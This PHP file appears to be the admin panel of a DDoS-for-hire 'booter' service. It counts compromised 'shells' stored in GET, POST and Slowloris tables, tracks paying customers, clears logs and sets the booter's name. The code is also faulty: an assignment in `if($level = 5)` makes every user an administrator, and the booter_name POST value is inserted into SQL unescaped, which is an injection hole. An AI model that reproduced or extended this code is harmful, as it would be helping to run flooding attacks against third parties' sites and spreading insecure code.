<?php

$file = basename(__FILE__);
if(eregi($file,$_SERVER['REQUEST_URI'])) {
    die("Sorry but you cannot access this file directly for security reasons.");
}

$username = $_SESSION['user_name'];
$id = $_SESSION['user_id'];
$level = $_SESSION['user_level'];

$rs_all = mysql_query("select count(*) as total_all from users") or die(mysql_error());
$rs_active = mysql_query("select count(*) as total_active from users where approved='1'") or die(mysql_error());
$rs_total_pending = mysql_query("select count(*) as tot from users where approved='0'");

list($total_pending) = mysql_fetch_row($rs_total_pending);
list($all) = mysql_fetch_row($rs_all);
list($active) = mysql_fetch_row($rs_active);

if($level = 5) {
    $level = "Administrator";
} else {
    $level = "Paid Customer";
}

$result = mysql_query("SELECT * FROM getshells");
$num_rows = mysql_num_rows($result); // Count the entries in the GET shells table
$result2 = mysql_query("SELECT * FROM postshells");
$num_rows2 = mysql_num_rows($result2); // Count the entries in the POST shells table
$result3 = mysql_query("SELECT * FROM slowloris");
$num_rows3 = mysql_num_rows($result3); // Count the entries in the Slowloris shells table

$shellsOnline = $num_rows + $num_rows2 + $num_rows3; // Add the 3 tables together to form one value.

$page_limit = 10;


$host  = $_SERVER['HTTP_HOST'];
$host_upper = strtoupper($host);
$login_path = @ereg_replace('admin','',dirname($_SERVER['PHP_SELF']));
$path   = rtrim($login_path, '/\\');

// filter GET values
foreach($_GET as $key => $value) {
	$get[$key] = filter($value);
}

foreach($_POST as $key => $value) {
	$post[$key] = filter($value);
}

        if(isset($_POST['EmptyLogs'])) {
        mysql_query("TRUNCATE TABLE `logs`");
        echo "<br><div class=\"divider\"><center>Logs have been cleared</center></div>";
    }
        if(isset($_POST['EmptyNews'])) {
        mysql_query("TRUNCATE TABLE `news`");
        echo "<br><div class=\"divider\"><center>News has been cleared</center></div>";
    }
        if(isset($_POST['EmptyUsers'])) {
        mysql_query("DELETE FROM users WHERE approved = 0");
        echo "<br><div class=\"divider\"><center>Unapproved users have been cleared from the database.</center></div>";
    }

        if(isset($_POST['SubmitConfig'])) {
            $booterName = $_POST['bootername'];
            mysql_query("INSERT INTO `config` (`booter_name`) VALUES ('" . $booterName . "')") or die(mysql_error());
        }

?>